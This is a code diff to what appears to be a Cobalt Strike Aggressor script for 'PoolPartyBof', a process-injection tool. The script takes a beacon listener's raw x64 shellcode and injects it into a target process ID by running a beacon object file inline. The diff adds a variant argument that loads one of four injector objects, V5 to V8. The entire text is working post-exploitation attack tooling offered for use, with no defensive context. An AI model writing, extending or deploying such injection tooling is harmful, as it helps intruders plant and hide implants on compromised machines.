@@ -7,6 +7,7 @@ beacon_command_register (
 alias PoolPartyBof {
     $pid = $2;
     $listener = $3;
+    $Varient = $4;
 
     if (listener_info($listener) is $null) {
         berror($1, "Could not find listener $listener");
@@ -15,13 +16,32 @@ alias PoolPartyBof {
     else {
         $sc_data = artifact_payload($listener, "raw", "x64");
 
-        local('$handle $data $args');
-        $handle = openf(script_resource("PoolPartyBof.x64.o"));
-        $data = readb($handle, -1);
-        closef($handle);
-        
+        if ($Varient == 7) {
+            local('$handle $data $args');
+            $handle = openf(script_resource("PoolPartyBof_V7.x64.o"));
+            $data = readb($handle, -1);
+            closef($handle);
+        }
+        else if ($Varient == 5) {
+            local('$handle $data $args');
+            $handle = openf(script_resource("PoolPartyBof_V5.x64.o"));
+            $data = readb($handle, -1);
+            closef($handle);
+        }
+        else if ($Varient == 6) {
+            local('$handle $data $args');
+            $handle = openf(script_resource("PoolPartyBof_V6.x64.o"));
+            $data = readb($handle, -1);
+            closef($handle);
+        }
+        else {
+            local('$handle $data $args');
+            $handle = openf(script_resource("PoolPartyBof_V8.x64.o"));
+            $data = readb($handle, -1);
+            closef($handle);
+        }
         $args = bof_pack($1, "ib", $pid, $sc_data);
-        btask($1, "Opening $pid and running PoolParty with $listener listener!");
+        btask($1, "Opening $pid and running PoolParty ($Varient Varient) with $listener listener!");
         beacon_inline_execute($1, $data, "go", $args);
     }
 }
